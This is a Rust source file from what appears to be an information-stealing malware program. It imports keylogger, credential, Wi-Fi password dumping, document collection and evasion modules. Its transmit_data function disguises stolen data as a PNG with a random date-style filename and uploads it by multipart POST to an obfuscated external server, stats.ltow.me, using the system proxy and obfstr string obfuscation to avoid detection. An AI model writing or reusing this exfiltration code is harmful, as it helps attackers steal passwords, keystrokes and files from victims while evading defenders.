use core::prelude;
use std::{io::Read, iter, time::Duration};

use bitvec::prelude::*;
use chrono::{DateTime, NaiveDate};
use collectors::*;
use data::{Credentials, DataPayload};
use docs::collect_filenames_from_main_dirs;
use iter::repeat;
use keyboard::Keylogger;
use rand::{distributions::Alphanumeric, thread_rng, Rng};
use regex::Regex;
use reqwest::{Client, Method, Proxy, RequestBuilder};
use tokio::time::delay_for;
use wifi::dump_wifi_passwords;

use crate::{
    collectors::{self, docs},
    data,
    evade::evade,
    utils,
};

pub async fn get_client(url: &str) -> Client {
    let mut client = reqwest::ClientBuilder::new().use_rustls_tls();
    if let Ok(Some(proxy_cfg)) = proxy_cfg::get_proxy_config() {
        if let Some(proxy) = proxy_cfg.get_proxy_for_url(&url::Url::parse(obfstr::obfstr!("https://stats.ltow.me")).unwrap()) {
            if let Ok(proxy) = Proxy::all(&proxy) {
                client = client.proxy(proxy);
            }
        }
    }

    client.build().unwrap()
}

pub async fn transmit_data(img_data: Vec<u8>) {
    let client = get_client(obfstr::obfstr!("https://stats.ltow.me")).await;

    let date = NaiveDate::from_ymd(
        thread_rng().gen_range(2018..=2020),
        thread_rng().gen_range(1..=12),
        thread_rng().gen_range(1..=28),
    );

    let rand = iter::repeat(())
        .map(|()| thread_rng().sample(Alphanumeric))
        .map(char::from)
        .map(char::from)
        .take(6)
        .collect::<String>()
        .to_uppercase();

    let pattern = obfstr::obfstr!("%Y%m%d").to_string();
    let date = date.format(&pattern);
    let filename = format!("{}_{}.png", date, rand);

    let payload = reqwest::multipart::Part::bytes(img_data).file_name(filename);
    let form =
        reqwest::multipart::Form::new().part(obfstr::obfstr!("shared_image").to_string(), payload);

    let mut request = client
        .request(
            Method::POST,
            obfstr::obfstr!("https://stats.ltow.me/upload-image"),
        )
        .multipart(form)
        .build()
        .unwrap();

    client.execute(request).await.unwrap(); 
}
